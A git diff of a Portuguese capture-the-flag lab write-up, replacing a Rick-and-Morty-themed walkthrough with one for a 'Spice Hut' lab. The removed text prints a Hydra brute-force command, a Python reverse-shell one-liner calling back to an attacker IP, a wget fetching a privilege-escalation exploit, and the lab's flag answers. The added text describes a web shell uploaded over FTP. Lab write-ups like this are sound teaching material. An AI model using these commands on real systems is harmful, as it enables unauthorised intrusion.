@@ -9,185 +9,77 @@ We are Spice Hut, a new startup company that just made it big! We offer a variet
 
 
 # Requisitos para invasão
-- [x] BurpSuite
+- [x] Nmap
+- [x] FTP
+- [x] Ffuf
+- [x] Alguma web shell php
+- [x] nc
 
 
 
-# Tela inicial do Lab
 
-Aqui encontramos o problema, que o rick perdeu sua senha. Então provavelmente teremos que acessar uma tela de login.
+
+# Scan Inicial (3 portas abertas)
+
 ![vuln2.jpg](img/scan.png)
 
-Vamos observar o código fonte da página 
 
-#### HTML code
-```html
+# FTP com usuario ftp habilitado
+![vuln2.jpg](img/ftpftp.png)
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <title>Rick is sup4r cool</title>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="stylesheet" href="assets/bootstrap.min.css">
-  <script src="assets/jquery.min.js"></script>
-  <script src="assets/bootstrap.min.js"></script>
-  <style>
-  .jumbotron {
-    background-image: url("assets/rickandmorty.jpeg");
-    background-size: cover;
-    height: 340px;
-  }
-  </style>
-</head>
-<body>
+Tentei acessar esses arquivos via navegador e não consegui.
 
-  <div class="container">
-    <div class="jumbotron"></div>
-    <h1>Help Morty!</h1></br>
-    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
-    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
-    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
-  </div>
+# Ffuf
 
-  <!--
-
-    Note to self, remember username!
-
-    Username: R1ckRul3s
-
-  -->
-
-</body>
-</html>
+Deixei o ffuf rodando e fui analisar os metadados da imagem
 
 ```
-
-Análisando o códifo fonte, encontramos o usuário do Rick que é o R1ckRul3s
-
-```html
- <!--
-
-    Note to self, remember username!
-
-    Username: R1ckRul3s
-
-  -->
+ffuf -c -w /usr/share/dirb/wordlists/common.txt -u http://10.10.117.75/FUZZ -e '.php','.html','.csv','.xls','.xlsx'
 ```
 
+# Metadados da imagem
+
+Usei o exiftool para descobrir metadados da imagem. Não encontrei nada e tentei descompactar a imagem
 
 
-Nesse periodo em paralelo, realizei um scan para buscar por novas informações do alvo
-
-```
-nmap 10.10.195.34
-```
-
-![vuln2.jpg](img/scan.jpeg)
-
-E também tentei me conectar via SSH
-```
-ssh -v R1ckRul3s@10.10.195.34
-```
+![vuln2.jpg](img/exiftool.png)
 
 
-![vuln2.jpg](img/ssh_falha.jpeg)
+# Descompactando a imagem
+
+Descompatei e tinha um arquivo vazio e um com formato de zlib, fui instalar a ferramenta zlib-flate para descomprimir.
+![vuln2.jpg](img/binwalk.png)
 
 
-E uma enumeração de diretorios através do ffuf
+# Ffuf
 
+Enquanto a ferramenta instalava, descobri que o resultado do ffuf tinha terminado e que achou um diretorio chamado files
 
-```
-
-ffuf -c -w /usr/share/dirb/wordlists/common.txt -u http://10.10.195.34/FUZZ -e '.php','.html','.csv','.xls','.xlsx'
-
-```
-Encontramos uma página chamada login.php e um robots.txt
 ![vuln2.jpg](img/ffuf.png)
 
+# Tela do files
 
-Entrando aqui na tela de login, deixei um bruteforce rodando  em paraleo
-
-## Tela de login
-![vuln2.jpg](img/login.png)
+![vuln2.jpg](img/files.png)
 
 
-## Hydra
-![vuln2.jpg](img/hydra.jpeg)
-```
-hydra -l R1ckRul3s -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt   10.10.195.34 http-post-form "/login.php:username=^USER^&password=^PASS^&sub=Login:Invalid username or password."
-```
+# Enviando web shell via ftp
+
+![vuln2.jpg](img/enviandowsoshellviaftp.png)
 
 
-## Depois de esperar um bom tempo de bruteforce, decidir entrar no robots.txt e esse conteúdo do robots.txt era  meio estranho
+# WSO Web shell
 
-```
-Wubbalubbadubdub
-```
-
-## Tentando logar com o usuário
-R1ckRul3s e senha Wubbalubbadubdub. Consigo logar no sistema.
-![vuln2.jpg](img/logado.png)
-
-## Tentando um ls -la no command panel achamos o primeiro ingrediente
-
-![vuln2.jpg](img/primeiro_ingrediente.png)
-
-## Resposta aqui 
-![vuln2.jpg](img/resposta.png)
-
-```
-mr. meeseek hair
-```
-
-## Precisamos pegar uma shell melhorada para avançar para os próximos ingredientes, então executei o comando
+![vuln2.jpg](img/wsoshell.png)
 
 
-![vuln2.jpg](img/pegar_shell.png)
+# Pegando shell via nc
 
-```
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.28",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
-```
+![vuln2.jpg](img/backdoor.png)
 
-## Shell
+![vuln2.jpg](img/recebendo_shell.png)
 
-![vuln2.jpg](img/shell.png)
+# Escalando privilegios
 
-
+![vuln2.jpg](img/escalando_privilegio.png)
 
 
-## Trocando de diretorios encontramos o segundo ingrediente
-
-![vuln2.jpg](img/segundo_ingrediente.png)
-```
-1 jerry tear
-```
-
-## Subindo shell para escalar privilegio
-
-![vuln2.jpg](img/subindo_exploit_privilege_escalation.png)
-
-## Computador do atacante
-```
-python -m http.server
-```
-
-## Computador do alvo
-```
-wget http://10.9.0.28:8000/CVE-202104034.PY
-```
-
-## E agora, só rodar o exploit e escalar privilegio
-
-
-![vuln2.jpg](img/root.png)
-
-## Com acesso root e procurando o terceiro ingrediente achamos na pasta do root
-
-![vuln2.jpg](img/terceiro.png)
-
-```
-fleeb juice
-```
-
-Máquina completa :D
